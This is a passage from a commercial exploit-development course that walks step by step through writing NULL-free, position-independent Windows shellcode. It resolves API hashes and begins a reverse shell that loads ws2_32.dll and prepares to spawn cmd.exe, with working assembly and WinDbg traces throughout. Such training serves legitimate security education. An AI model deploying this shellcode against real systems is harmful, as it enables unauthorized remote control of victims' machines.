cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02b4001b 6aff            push    0FFFFFFFFh 
 
0:002> t 
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02b40000 esi=01307890 edi=01301c88 
eip=02b4001d esp=02d3fd4c ebp=02d3ff58 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02b4001d ffd0            call    eax {KERNEL32!TerminateProcessStub (76e6bd30)} 
 
233 (Microsoft - TerminateProcess), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
terminateprocess 
234 (Microsoft - GetCurrentProcess), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
getcurrentprocess 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
263 
 
0:002> dds @esp L2 
02d3fd4c  ffffffff 
02d3fd50  00000000 
Listing 314 - Pushing the arguments for the TerminateProcess API on the stack 
We can cleanly exit our shellcode by stepping over the call to TerminateProcess. Let’s observe the 
exit in WinDbg: 
0:002> p 
WARNING: Step/trace thread exited 
eax=76e6bd30 ebx=76e40000 ecx=02d3fd34 edx=770a4550 esi=01307890 edi=01301c88 
eip=770a4550 esp=02d3fd34 ebp=02d3fd44 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!KiFastSystemCallRet: 
770a4550 c3              ret 
Listing 315 - Executing TerminateProcess inside WinDbg 
To confirm that our shellcode works as expected, we can comment out the INT3 instruction from 
our shellcode and execute it without attaching WinDbg to the Python process. Rather than 
crashing after we press I, our shellcode should exit cleanly in this case. 
With the functions implemented, we now have a way of resolving any symbol exported by 
kernel32.dll. Being able to resolve symbols allows us to chain multiple API calls with little 
overhead and achieve complex functionality within our shellcode. 
7.4.4.1 Exercises 
1. 
Update the start function of the shellcode to include the arguments and call to the 
TerminateProcess API. 
2. 
Continue to modify the shellcode and add all the required functions for comparing the hash 
and retrieving the VMA of the TerminateProcess API. 
3. 
Run the updated shellcode and attach WinDbg to the Python process. Set up appropriate 
software breakpoints to trace the important steps of the shellcode and ensure it is retrieving 
the correct memory address of the function. 
4. 
Comment out the INT3 instruction and run your updated shellcode without a debugger 
attached. Ensure that it exits without causing a crash. 
7.5 NULL-Free Position-Independent Shellcode (PIC) 
Before we decide which APIs to call and what our shellcode should achieve, let’s run it once more 
with the uncommented INT3 instruction. While our shellcode is functioning correctly, we’ll notice 
that the opcodes it generates contain NULL bytes: 
0:002> g 
(15e8.1408): Break instruction exception - code 80000003 (first chance) 
eax=450240f7 ebx=00000000 ecx=02950000 edx=02950000 esi=02950000 edi=02950000 
eip=02950000 esp=02b4fdb0 ebp=02b4fdc0 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02950000 cc              int     3 
 
0:002> u @eip L6 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
264 
02950000 cc              int     3 
02950001 89e5            mov     ebp,esp 
02950003 81ec00020000    sub     esp,200h 
02950009 e811000000      call    0295001f 
0295000e 6883b9b578      push    78B5B983h 
02950013 e822000000      call    0295003a 
Listing 316 - Verifying that our shellcode contains NULL bytes 
These NULL bytes are not a problem if we run our shellcode using the Python script. Using this 
shellcode in a real exploit, however, would be problematic as the NULL byte is usually a bad 
character. 
7.5.1 Avoiding NULL Bytes 
If we look at the instructions that generated the NULL bytes (Listing 316), we find that the first 
one is sub esp, 0x200. This instruction can also use a negative offset value, or we can use a 
combination of multiple instructions that achieve the same effect, as shown below: 
0:002> ? 0x0 - 0x210 
Evaluate expression: -528 = fffffdf0 
 
0:002> ? @esp + 0xfffffdf0 
Evaluate expression: 4340382624 = 00000001`02b4fba0 
 
0:002> r @esp 
esp=02b4fdb0 
 
0:002> ? 0x02b4fdb0 - 0x02b4fba0 
Evaluate expression: 528 = 00000210 
Listing 317 - Calculating the offset we need to ADD to ESP to avoid null bytes 
Listing 317 shows that rather than using a SUB operation with a value of 0x200, we can ADD a 
large offset and achieve a similar result. The end result will make ESP hold a memory address 
that will not contain any NULL bytes. 
Let’s quickly update our shellcode to make sure it successfully avoids the first instance of NULL 
bytes we encountered previously. 
import ctypes, struct 
from keystone import * 
 
CODE = ( 
    " start:                             "  # 
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN 
NOT DEBUGGING!!!! 
    "   mov   ebp, esp                  ;"  # 
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes 
    "   call  find_kernel32             ;"  # 
    "   push  0x78b5b983                ;"  #   TerminateProcess hash 
    "   call  find_function             ;"  # 
... 
Listing 318 - Replacing the SUB instruction with an ADD instruction to avoid null bytes 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
265 
To verify that our ADD instruction worked as intended, let’s run our shellcode again and inspect 
the opcodes inside WinDbg once we reach our INT3 instruction. 
0:002> u @eip L6 
02210000 cc              int     3 
02210001 89e5            mov     ebp,esp 
02210003 81c4f0fdffff    add     esp,0FFFFFDF0h 
02210009 e811000000      call    0221001f 
0221000e 6883b9b578      push    78B5B983h 
02210013 e822000000      call    0221003a 
Listing 319 - Verify the opcodes do not contain NULL bytes using WinDbg 
Excellent! We replaced the instruction and achieved a similar result without NULL bytes. We can 
do this for most of the instructions in our shellcode if they contain NULL bytes. 
Our next challenge is that our shellcode also contains CALL instructions, which generate NULL 
bytes (Listing 319). Let’s move on and tackle that. 
7.5.1.1 Exercise 
1. 
Go through the opcodes generated by the shellcode and replace any instruction except 
CALL- and JMP-type instructions to avoid NULL bytes. 
7.5.2 Position-Independent Shellcode 
Our CALL instructions235 generate NULL bytes because our code is calling the functions directly. 
Each direct function CALL, depending on the location of the function, will either invoke a near call 
containing a relative offset to the function, or a far call containing the absolute address, either 
directly or with a pointer. 
There are two ways we can address the CALL instructions. First, we could move all the functions 
being called above the CALL instruction. This would generate a negative offset and avoid NULL 
bytes. Our second option is to dynamically gather the absolute address of the function we want to 
call, and store it in a register. 
The second option provides more flexibility, especially for large shellcodes. This technique is 
often used by decoder components when the payload is encoded. The ability to gather the 
shellcode absolute address at runtime will provide us with a position independent code (PIC) 
shellcode that is both NULL-free and injectable anywhere in memory. 
This technique, which we will go over shortly, exploits the fact that a call to a function located in a 
lower address will use a negative offset and therefore has a high chance of not containing NULL 
bytes. Moreover, when executing the CALL instruction, the return address will be pushed onto the 
stack. This address can be then popped from the stack into a register and be used to dynamically 
calculate the absolute address of the function we are interested in. 
We can begin by slightly modifying our start function: 
import ctypes, struct 
from keystone import * 
 
235 (Faydoc - CALL), http://faydoc.tripod.com/cpu/call.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
266 
 
CODE = ( 
    " start:                             "  # 
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN 
NOT DEBUGGING!!!! 
    "   mov   ebp, esp                  ;"  # 
    "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes 
 
    " find_kernel32:                     "  # 
    "   xor   ecx, ecx                  ;"  #   ECX = 0 
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30]) 
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr 
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder 
 
    " next_module:                       "  # 
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address 
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name 
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next) 
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00? 
    "   jne   next_module               ;"  #   No: try next module 
... 
Listing 320 - resolving_symbols_0x04.py: Obtaining the location of our shellcode in memory 
Listing 320 displays the modified start function. After creating some space on the stack, we now 
go directly into the find_kernel32 function without using a CALL instruction. As the CALL 
instruction was not mandatory, removing it allows us to avoid the NULL bytes generated by the 
relative call. 
After obtaining the base address of kernel32.dll, we’ll reach the newly added functions which will 
gather the position of our shellcode in memory. 
We start with find_function_shorten. This function contains a single assembly instruction, which is 
a short jump to find_function_shorten_bnc. Because these functions are close to each other, the 
JMP instruction’s opcodes will not contain NULL bytes. 
    " find_function_shorten:             "  # 
    "   jmp find_function_shorten_bnc   ;"  #   Short jump 
 
    " find_function_ret:                 "  # 
    "   pop esi                         ;"  #   POP the return address from the stack 
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later 
usage 
    "   jmp resolve_symbols_kernel32    ;"  # 
 
    " find_function_shorten_bnc:         "  #    
    "   call find_function_ret          ;"  #   Relative CALL with negative offset 
 
    " find_function:                     "  # 
    "   pushad                          ;"  #   Save all registers 
Listing 321 - Executing a CALL to a function located higher in the code 
The code from Listing 321 shows that after reaching find_function_shorten_bnc, there is only one 
assembly instruction. This time we’ll use the CALL instruction with find_function_ret as the 
destination. Because this function is located higher than our CALL instruction, the generated 
opcodes will contain a negative offset that should be free of NULL bytes rather than a positive 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
267 
offset with NULL bytes. After we execute this CALL instruction, we will push the return address to 
the stack. The stack will point to find_function’s first instruction. 
Inspecting find_function_ret (Listing 321), we observe that the first instruction is a POP, which 
takes the return value we pushed on the stack and places it in ESI. After the POP instruction, ESI 
will point to the first instruction of find_function, allowing us to use an indirect call to invoke it. 
This address is then saved at a dereference of EBP at offset 0x04 for later use. 
Finally, we’ll move the assembly instructions to push the hash, resolve the function, and execute it 
at the end of our shellcode, as shown below: 
... 
    " find_function_finished:            "  # 
    "   popad                           ;"  #   Restore registers 
    "   ret                             ;"  # 
 
    " resolve_symbols_kernel32:              " 
    "   push  0x78b5b983                ;"  #   TerminateProcess hash 
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function 
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for 
later usage 
 
    " exec_shellcode:                    "  # 
    "   xor   ecx, ecx                  ;"  #   Null ECX 
    "   push  ecx                       ;"  #   uExitCode 
    "   push  0xffffffff                ;"  #   hProcess 
    "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess 
Listing 322 - Moving the functions requires us to resolve symbols and execute the APIs at the end of our shellcode 
One important thing to note, according to Listing 322, is that moving the functions requires us to 
move the assembly code responsible for calling find_function to resolve symbols and execute the 
APIs after find_function_finished. 
Let’s run our updated shellcode and, inside the debugger, inspect how we dynamically obtain its 
position in memory. We start by hitting our INT3 instruction and setting a breakpoint right at 
find_function_shorten. Once hit, we will take the jump and reach find_function_shorten_bnc: 
0:002> g 
(f34.1058): Break instruction exception - code 80000003 (first chance) 
eax=4fb1077f ebx=00000000 ecx=02900000 edx=02900000 esi=02900000 edi=02900000 
eip=02900000 esp=02affb70 ebp=02affb80 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02900000 cc              int     3 
 
0:002> u @eip L10 
... 
02900023 eb06            jmp     0290002b 
02900025 5e              pop     esi 
02900026 897504          mov     dword ptr [ebp+4],esi 
02900029 eb54            jmp     0290007f 
 
0:002> bp 02900023  
 
0:002> g 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
268 
Breakpoint 0 hit 
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=013d7808 edi=013d1cb0 
eip=02900023 esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02900023 eb06            jmp     0290002b 
 
0:002> t 
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=013d7808 edi=013d1cb0 
eip=0290002b esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0290002b e8f5ffffff      call    02900025 
Listing 323 - Hitting the breakpoint at the find_function_shorten and executing the JMP instruction 
As shown in Listing 323, the CALL instruction does not contain any NULL bytes due to the 
negative offset. Stepping into the call will push the return instruction on the stack. Let’s confirm 
that the return address points to find_function. 
0:002> t 
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=013d7808 edi=013d1cb0 
eip=02900025 esp=02aff95c ebp=02affb70 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02900025 5e              pop     esi 
 
0:002> dds @esp L1 
02aff95c  02900030 
 
0:002> u poi(@esp) 
02900030 60              pushad 
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch] 
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h] 
02900038 01df            add     edi,ebx 
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h] 
0290003d 8b4720          mov     eax,dword ptr [edi+20h] 
02900040 01d8            add     eax,ebx 
02900042 8945fc          mov     dword ptr [ebp-4],eax 
Listing 324 - Pushing the return address that points to the beginning of the find_function to the stack 
According to Listing 324, the return address is pushed to the stack and points to the first 
instruction of find_function. The next two instructions will POP the address of find_function into 
ESI, and save it at the memory location pointed to by EBP at offset 0x04. 
0:002> t 
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0 
eip=02900026 esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02900026 897504          mov     dword ptr [ebp+4],esi ss:0023:02affb74=00000000 
 
0:002> u @esi  
02900030 60              pushad 
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch] 
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h] 
02900038 01df            add     edi,ebx 
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h] 
0290003d 8b4720          mov     eax,dword ptr [edi+20h] 
02900040 01d8            add     eax,ebx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
269 
02900042 8945fc          mov     dword ptr [ebp-4],eax 
 
0:002> t 
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0 
eip=02900029 esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02900029 eb54            jmp     0290007f 
 
0:002> u poi(@ebp + 0x04) 
02900030 60              pushad 
02900031 8b433c          mov     eax,dword ptr [ebx+3Ch] 
02900034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h] 
02900038 01df            add     edi,ebx 
0290003a 8b4f18          mov     ecx,dword ptr [edi+18h] 
0290003d 8b4720          mov     eax,dword ptr [edi+20h] 
02900040 01d8            add     eax,ebx 
02900042 8945fc          mov     dword ptr [ebp-4],eax 
Listing 325 - Retrieving the address find_function in the ESI register and saving it for later usage 
The 
last 
instruction 
of 
find_function_ret 
is 
a 
short 
jump 
(Listing 
325) 
to 
the 
resolve_symbols_kernel32 function, where we use an indirect call to avoid NULL bytes: 
0:002> t 
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0 
eip=0290007f esp=02aff960 ebp=02affb70 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
0290007f 6883b9b578      push    78B5B983h 
 
0:002> t 
eax=4fb1077f ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0 
eip=02900084 esp=02aff95c ebp=02affb70 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02900084 ff5504          call    dword ptr [ebp+4]    ss:0023:02affb74=02900030 
 
0:002> p 
eax=76e6bd30 ebx=76e40000 ecx=00000000 edx=02900000 esi=02900030 edi=013d1cb0 
eip=02900087 esp=02aff95c ebp=02affb70 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
02900087 894510          mov     dword ptr [ebp+10h],eax ss:0023:02affb80=02affbc8 
 
0:002> u @eax 
KERNEL32!TerminateProcessStub: 
76e6bd30 8bff            mov     edi,edi 
76e6bd32 55              push    ebp 
76e6bd33 8bec            mov     ebp,esp 
76e6bd35 5d              pop     ebp 
76e6bd36 ff254c49ec76    jmp     dword ptr [KERNEL32!_imp__TerminateProcess 
(76ec494c)] 
76e6bd3c cc              int     3 
76e6bd3d cc              int     3 
76e6bd3e cc              int     3 
Listing 326 - Using an indirect call to resolve the address of TerminateProcess 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
270 
The output from Listing 326 shows that the indirect call does not contain any NULL bytes. 
Additionally, by stepping over the call, we can confirm that our shellcode is working correctly and 
can retrieve the virtual memory address of TerminateProcess. 
We can remove all breakpoints and let our shellcode continue execution to cleanly terminate the 
process again. 
0:002> bc * 
 
0:002> bl 
 
0:002> g 
eax=00000101 ebx=013d2868 ecx=016bf87c edx=770a4550 esi=014103e8 edi=014105a8 
eip=770a4550 esp=016bf87c ebp=016bfa8c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!KiFastSystemCallRet: 
770a4550 c3              ret 
Listing 327 - Calling TerminateProcess and cleanly terminating the process 
In this section, we learned a technique that enabled us to maintain our shellcode’s functionality 
while using indirect CALL instructions to avoid NULL bytes. Our shellcode is also now position-
independent, which means we can inject it anywhere in memory and it will dynamically retrieve its 
position. 
With all the building blocks of a shellcode in place, it’s time to choose our shellcode’s purpose. 
Next, we’ll work on resolving and calling exported symbols that are required to achieve the 
functionality of a reverse shell. 
7.5.2.1 Exercises 
1. 
Update your shellcode with the necessary functions to dynamically retrieve its position in 
memory. 
2. 
Single step through the instructions and ensure that you understand how to avoid NULL 
bytes by using CALL instructions, as well as indirect calls, to generate a negative offset. 
3. 
Using WinDbg, step through your shellcode and ensure that it still works as expected. 
4. 
Comment out the INT3 instruction and run the shellcode without a debugger attached. 
Ensure that it terminates the process without crashing. 
7.6 Reverse Shell 
We are now ready to make a fully-functioning shellcode. In this section, we’ll explore how to 
create one of the most common shellcodes, a reverse shell. 
It is important to keep in mind that while a reverse shell is common, it is not the 
only thing that can be done using shellcode. The shellcode in modern exploits 
will often store an additional exploit, creating what is commonly known as an 
exploit chain. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
271 
A review of a number of publicly-available reverse shells written in C236 reveals that most of the 
required APIs are exported by Ws2_32.dll. We first need to initialize the Winsock DLL using 
WSAStartup.237 This is followed by a call to WSASocketA238 to create the socket, and finally 
WSAConnect239 to establish the connection. 
The last API we need to call is CreateProcessA240 from kernel32.dll. This API will start cmd.exe. 
Now that we have an overview of the libraries and APIs we need, let’s break them down into 
multiple steps. 
7.6.1 Loading ws2_32.dll and Resolving Symbols 
Our shellcode can already resolve symbols from kernel32.dll, so our first step is to resolve the 
CreateProcessA API (which is exported by kernel32.dll) and store the address for later use. Next, 
we need to load ws2_32.dll into the shellcode memory space and obtain its base address. Both of 
these tasks can be achieved using LoadLibraryA,241 which is exported by kernel32.dll. 
In order to resolve symbols from ws2_32.dll, we could use the GetProcAddress API from 
kernel32.dll. However, we can simply reuse the functions that we have implemented previously. 
The only requirement is that the base address of the module needs to be in the EBX register, so 
that relative virtual addresses can be translated to virtual memory addresses. 
Let’s modify our current shellcode to load ws2_32.dll and resolve the required symbols for our 
reverse shell: 
    " find_function_finished:            "  # 
    "   popad                           ;"  #   Restore registers 
    "   ret                             ;"  # 
 
    " resolve_symbols_kernel32:          " 
    "   push  0x78b5b983                ;"  #   TerminateProcess hash 
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function 
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for 
later usage 
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash 
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function 
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later 
usage 
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash 
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function 
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later 
usage 
... 
Listing 328 - Resolving LoadLibraryA and CreateProcessA as part of the resolve_symbols_kernel32 function 
 
236 (sololearn - Windows Reverse Shell), https://code.sololearn.com/c9QMueL0jHiy/#cpp 
237 (Microsoft - WSAStartup), https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup 
238 (Microsoft - WSASocketA), https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa 
239 (Microsoft - WSAConnect), https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect 
240 (Microsoft - CreateProcessA), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
createprocessa 
241 (Microsoft - LoadLibraryA), https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
272 
Our updated shellcode resolves the remaining two symbols we need from kernel32.dll, 
LoadLibraryA and CreateProcessA, as part of the resolve_symbols_kernel32 function. 
Next, we need to set up the call to LoadLibraryA. 
    " load_ws2_32:                       "  # 
    "   xor   eax, eax                  ;"  #   Null EAX 
    "   mov   ax, 0x6c6c                ;"  #   Move the end of the string in AX 
    "   push  eax                       ;"  #   Push EAX on the stack with string NULL 
terminator 
    "   push  0x642e3233                ;"  #   Push part of the string on the stack 
    "   push  0x5f327377                ;"  #   Push another part of the string on the 
stack 
    "   push  esp                       ;"  #   Push ESP to have a pointer to the 
string 
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA 
Listing 329 - Load ws2_32.dll into the shellcode memory space 
We’ll start by setting EAX to NULL. Then, we move the end of the ws2_32.dll string to the AX 
register and push it to the stack. This ensures that our string will be NULL terminated, while 
avoiding NULL bytes in our shellcode. 
After two more PUSH instructions, the entire string is pushed to the stack. The following 
instruction pushes the stack pointer (ESP) to the stack. This is necessary because LoadLibraryA 
requires a pointer to the string that is currently located on the stack. 
Finally, we call LoadLibraryA and proceed into the resolve_symbols_ws2_32 function. 
    " resolve_symbols_ws2_32:            " 
    "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to 
EBX 
    "   push  0x3bfcedcb                ;"  #   WSAStartup hash 
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function 
    "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later 
usage 
... 
Listing 330 - Moving the ws2_32.dll base address to EBX and calling find_function 
This function resuses our find_function implementation to resolve symbols from ws2_32.dll. But 
first, we need to set the EBX register to the base address of ws2_32.dll. 
The return value of LoadLibraryA is a handle to the module specified as an argument. This handle 
comes in the form of the base address of the module. If the call to LoadLibraryA is successful, 
then we should have the base address of ws2_32.dll in the EAX register, allowing us to move it to 
EBX using a simple MOV instruction: 
With the base address of ws2_32.dll in EBX, we push the individual hashes for every required 
symbol. In our case, we start with WSAStartup and call find_function to resolve them. 
Let’s run our updated shellcode to confirm it works inside our debugger. After hitting our INT3 
instruction, we will set up a breakpoint right at the beginning of load_ws2_32 and resume the 
execution flow. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
273 
0:002> bp 026000a0  
 
0:002> bl 
     0 e Disable Clear  026000a0     0001 (0001)  0:****  
 
0:002> g 
Breakpoint 0 hit 
eax=76e68d80 ebx=76e40000 ecx=00000000 edx=02600000 esi=02600030 edi=00d31ca0 
eip=026000a0 esp=027ffd10 ebp=027fff2c iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
026000a0 31c0            xor     eax,eax 
Listing 331 - Reaching the beginning of the load_ws2_32 function in our shellcode 
We proceed to single step through the instructions until we reach the call to LoadLibraryA. Before 
stepping over the call, let’s verify the first argument pushed on the stack: 
0:002> r 
eax=00006c6c ebx=76e40000 ecx=00000000 edx=02600000 esi=02600030 edi=00d31ca0 
eip=026000b2 esp=027ffd00 ebp=027fff2c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
026000b2 ff5514          call    dword ptr [ebp+14h]  
ss:0023:027fff40={KERNEL32!LoadLibraryAStub (76e6a5c0)} 
 
0:002> da poi(esp) 
027ffd04  "ws2_32.dll" 
 
0:002> p 
eax=75070000 ebx=76e40000 ecx=00000000 edx=00000000 esi=02600030 edi=00d31ca0 
eip=026000b5 esp=027ffd04 ebp=027fff2c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
026000b5 89c3            mov     ebx,eax 
 
0:002> r @eax 
eax=75070000 
 
0:002> lm m ws2_32 
Browse full module list 
start    end        module name 
75070000 750cb000   WS2_32     (deferred)             
Listing 332 - Loading ws2_32.dll in memory and obtaining its base address 
The output from Listing 332 shows that our argument is set up correctly before the call to 
LoadLibraryA. 
After we step over the call, we’ll notice that ws2_32.dll is now loaded in the memory space of our 
shellcode, and EAX contains its base address. 
Finally, we need to ensure that our find_function implementation works with ws2_32.dll. Let’s step 
through the assembly instructions to reach the PUSH instruction that places the hash for 
WSAStartup on the stack, and then call find_function. 
0:002> t 
eax=75070000 ebx=75070000 ecx=00000000 edx=00000000 esi=02600030 edi=00d31ca0 
eip=026000b7 esp=027ffd04 ebp=027fff2c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
274 
026000b7 68cbedfc3b      push    3BFCEDCBh 
 
0:002> t 
eax=75070000 ebx=75070000 ecx=00000000 edx=00000000 esi=02600030 edi=00d31ca0 
eip=026000bc esp=027ffd00 ebp=027fff2c iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
026000bc ff5504          call    dword ptr [ebp+4]    ss:0023:027fff30=02600030 
 
0:002> p 
eax=750825e0 ebx=75070000 ecx=00000000 edx=00000000 esi=02600030 edi=00d31ca0 
eip=026000bf esp=027ffd00 ebp=027fff2c iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
026000bf 89451c          mov     dword ptr [ebp+1Ch],eax ss:0023:027fff48=cacdbf08 
 
0:002> u @eax 
WS2_32!WSAStartup: 
750825e0 8bff            mov     edi,edi 
750825e2 55              push    ebp 
750825e3 8bec            mov     ebp,esp 
750825e5 6afe            push    0FFFFFFFEh 
750825e7 6898fb0a75      push    offset WS2_32!StringCopyWorkerW+0x2fc (750afb98) 
750825ec 6850680875      push    offset WS2_32!_except_handler4 (75086850) 
750825f1 64a100000000    mov     eax,dword ptr fs:[00000000h] 
750825f7 50              push    eax 
Listing 333 - Resolving WSAStartup from ws2_32.dll 
Listing 333 shows that our find_function implementation works correctly, even when using a 
different DLL. 
After resolving all the required symbols for our shellcode, our next step is calling one API at a time 
to obtain a reverse shell. 
7.6.1.1 Exercises 
1. 
Update the shellcode to resolve the LoadLibraryA and CreateProcessA symbols from 
kernel32.dll. 
2. 
As part of the shellcode, include a function that will call the LoadLibraryA API and load 
ws2_32.dll in the memory space of our shellcode. Confirm the base address with the result in 
the EAX register. 
3. 
Reuse find_function to resolve the WSAStartup, WSASocketA, and WSAConnect symbols. 
7.6.2 Calling WSAStartup 
As discussed previously, the first API we need to call is WSAStartup242 to initiate the use of the 
Winsock DLL by our shellcode. Let’s inspect the function prototype: 
int WSAStartup( 
  WORD      wVersionRequired, 
  LPWSADATA lpWSAData 
); 
 
242 (Microsoft - WSAStartup), https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
275 
Listing 334 - The prototype of WSAStartup 
The first parameter appears to be the version of the Windows Sockets specification. We’ll set this 
parameter to “2.2”. We can learn more about other available versions from the official 
